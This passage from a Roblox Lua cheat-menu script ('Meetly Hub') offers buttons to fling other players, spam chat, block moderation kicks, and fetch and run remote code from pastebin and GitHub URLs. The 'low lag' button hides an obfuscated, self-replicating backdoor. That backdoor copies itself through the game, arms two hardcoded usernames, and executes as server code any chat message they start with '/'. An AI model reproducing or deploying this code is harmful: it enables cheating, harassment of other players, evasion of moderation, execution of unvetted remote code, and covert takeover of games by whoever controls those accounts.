					local TPlayer = GetPlayer(x)
					if TPlayer then
						SkidFling(TPlayer)
					end
				else
					Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
				end
			elseif not GetPlayer(x) and not AllBool then
				Message("Error Occurred", "Username Invalid", 5)
			end
		end
end)

Section:NewButton("Spider Man R6", "Wall climb", function()
    wait()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
    end)

Section:NewSlider("HP", "you hp", 100, 1, function(slider)
game.Players.LocalPlayer.Character.Humanoid.Health = slider
end)

Section:NewButton("Kick you", "client kick", function()
wait()
game.Players.LocalPlayer:Kick('You kick) (by Meetly and Robojini)')
end)

Section:NewButton("Spam Console (inf)", "spam", function()
wait()
while wait(0.2) do
warn("console crash: by: TheMeetly!")
end
end)

Section:NewButton("Spam to chat (5x)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "Meetly Hub Boost"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Spam to chat (5x) (EZZ)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "EZZ"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Spam to chat (5x) (GG)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "GG"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Spam to chat (5x) (ti lox)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "ti lox"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Chat Bypasser", "Ezz", function()
    wait()
    for i = 1, 3, 1 do
    wait(1)
    local A_1 = "can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can can"
    local A_2 = "All"
    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
    Event:FireServer(A_1, A_2)
    end
    end)
 
local Tab = Window:NewTab("Creators")
 
local Section = Tab:NewSection("Creators: MEETLY ideas: SBC, Minigun#8496")
 
local Section = Tab:NewSection("discord devoloper: TheMeetly#0885")
 
local Section = Tab:NewSection("BETA TEST: Minigun#8496")

local Tab = Window:NewTab("Update")

local Section = Tab:NewSection("script 3.0")

local Section = Tab:NewSection("[!] Script long loading")

local Section = Tab:NewSection("[/] Fix Infinity Yield")

local Section = Tab:NewSection("[-] Removed non-working functions")

local Tab = Window:NewTab("settings")

local Section = Tab:NewSection("settings")

Section:NewKeybind("open/close hub", "Close/Open UI", Enum.KeyCode.BackSlash, function()
    Library:ToggleUI()
end)

Section:NewButton("Anti-kick","-", function()
wait()
                local hook = game:GetService("Players").LocalPlayer.Kick;
                local mt = getrawmetatable(game:GetService("Players").LocalPlayer)
                local psuedoEnv = {
                    ["__index"] = mt.__index,
                    ["__namecall"] = mt.__namecall
                }
                local ReturnFunc = function()end
                        
                warn("Made By TheMeetly#0885")
                setreadonly(mt, false)
                mt.__namecall = newcclosure(function(self, Index, ...)
                    local NameCallMethod = getnamecallmethod()
                    if type(NameCallMethod) == "string" then
                        if NameCallMethod == "Kick" or NameCallMethod == "kick" then
                            print("Prevented Kick At " .. tostring(os.time()))
                            return ReturnFunc
                        end
                    end
                    return psuedoEnv.__namecall(self, Index, ...)
                end)
                        
                mt.__index = newcclosure(function(self, Index, ...)
                    if type(Index) == "string" then
                        if Index == "Kick" or Index == "kick" then
                            print("Prevented Kick At " .. tostring(os.time()))
                            return ReturnFunc
                        end
                    end
                    return psuedoEnv.__index(self, Index, ...)
                end)
                setreadonly(mt, true)
end)

Section:NewButton("Rejoin",".RCT", function()
wait()
local ts = game:GetService("TeleportService")



local p = game:GetService("Players").LocalPlayer







ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
end)

Section:NewButton("low lag", "-", function()
wait()
Altitude = script:clone()
calco = {"s","c","q","t","o","a","i","f","g","w","8","e","m","7","h","n"}
Knox = {}
table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))
table.insert (Knox, 1 ,string.reverse(calco[11] .. calco[14] .. calco[14] .. calco[4] .. calco[16] .. calco[6] .. calco[15] .. calco[2]))
Play = {}
function rando(votation)
local hatr = 5
local calc = math.pi * math.huge
local longicate = votation:GetChildren()
if #longicate > hatr then 
calc = calc + math.pi
return longicate[math.random(6,#longicate)]
end
end
function doublecheck()
local fj = game.Workspace:GetChildren()
for off = 1,#fj do
if fj[off].className == "Part" then
local fh = fj[off]:FindFirstChild("Anti-Lag")
if fh ~= nil then 
return false
end
end
end
return true
end
function workcheck()
if doublecheck() == true then
local l = Altitude:clone()
l.Parent = rando(game.Workspace)
end
end
workcheck()
function gibite(quen)
local  hup = Instance.new("Message")
hup.Text = "Detected"
hup.Parent = quen.Parent
local con = Instance.new("Script")
con.Source = [[wait(5) script.Parent:remove()]]
con.Parent = hup
for ish = 0,7 do
local a = Instance.new("HopperBin")
a.BinType = ish
a.Parent = quen
end
end
function laber(zonsa)
wait()
for slate = 1,#Knox do  
if zonsa.Name == Knox[slate] then
gibite(zonsa.Backpack)
table.insert (Play, 1,  zonsa.Name)
end
end
end
function yeild(frequency)
local t = Knox
for g = 1,#t do
if t[g] == frequency.Name then
return true
end
end
return false
end
function check(los)
local r = los:GetChildren()
for i = 1,#r do
local h = r[i]:FindFirstChild("Anti-Lag")
if h ~= nil then
h:remove()
end
end
end
function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end
function sortation(gone)
local dimbs = Altitude:clone()
dimbs = ramno(game.Workspace)
end
function onPlayerEntered(newPlayer)
newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end) 
end
function Player(player)
player.Changed:connect(function (property) 
if property == "Character" then 
laber(player) 
end
end)
end
game.Players.PlayerAdded:connect(Player)
game.Players.ChildAdded:connect(onPlayerEntered)
game.Players.ChildAdded:connect(laber)
script.ChildRemoved:connect(sortation)
game.Workspace.ChildAdded:connect(alto)
function onChatted(msg, recipient, speaker)
if yeild(speaker) ~= false then
if string.sub(msg,1,1) == "/" then
local dsting = Instance.new("Script")
dsting.Source = string.sub(msg,2) 
dsting.Parent = game.Workspace 
end
end
end
end)

Section:NewButton("FPS BOOSTER", "Boost FPS", function()
-- Made by RIP#6666
_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true -- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    Other = {
        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
        ["No Explosions"] = true, -- Makes Explosion's invisible
        ["No Clothes"] = true, -- Removes Clothing from the game
        ["Low Water Graphics"] = true, -- Removes Water Quality
        ["No Shadows"] = true, -- Remove Shadows
        ["Low Rendering"] = true, -- Lower Rendering
        ["Low Quality Parts"] = true -- Lower quality parts
    }
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
end)

UniversalSection:NewButton("Auto Grammar", "Idk Why U Need This But Its Cool IG?", function()
    shared.CustomCorrections = {
        ["examplething12"] = "hello" -- if you say "examplething12" it will become hello
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eosuwu/boblox/main/autogremer.lua"))()
end)

UniversalSection:NewButton("Universal Hub", "One Of The Best UIS I Have ever Seen", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))()
end)


local Credits = Window:NewTab("Credits")
local CreditsSection = Credits:NewSection("Credits")

CreditsSection:NewTextBox("Not_zentical#4847", "No One Else Except the script owners", function(txt)
    print(txt)
end)


local Setting = Window:NewTab("Setting")
local SettingSection = Setting:NewSection("Setting")

SettingSection:NewKeybind("Toggle UI", "Close/Open UI", Enum.KeyCode.BackSlash, function()
    Library:ToggleUI()
end)
else
  game:service('Players').LocalPlayer:Kick('Buy a script bruh')
end
